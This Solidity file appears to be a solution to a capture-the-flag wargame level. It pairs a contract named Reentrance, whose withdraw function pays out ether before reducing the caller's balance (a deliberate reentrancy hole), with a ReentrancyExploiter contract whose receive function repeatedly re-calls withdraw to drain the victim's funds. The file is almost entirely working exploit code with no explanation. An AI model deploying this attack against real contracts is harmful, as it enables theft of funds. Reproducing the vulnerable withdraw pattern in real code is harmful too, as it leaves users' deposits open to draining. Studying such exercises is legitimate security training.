// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;
import "@openzeppelin/contracts/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;
    mapping(address => uint) public balances;

    constructor() public payable {
        balances[msg.sender] = balances[msg.sender].add(msg.value);
    }

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }

    function withdraw(uint _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract ReentrancyExploiter {
    Reentrance private reentrancy;
    uint256 private amount = 0.001 ether;

    constructor(Reentrance _contract) public payable {
        reentrancy = _contract;
    }

    function deposit() external {
        reentrancy.donate{value: amount}(address(this));
    }

    function withdraw() external {
        _withdraw();
    }

    function _withdraw() private {
        reentrancy.withdraw(amount);
    }

    receive() external payable {
        if (address(reentrancy).balance > 0) {
            _withdraw();
        }
    }
}
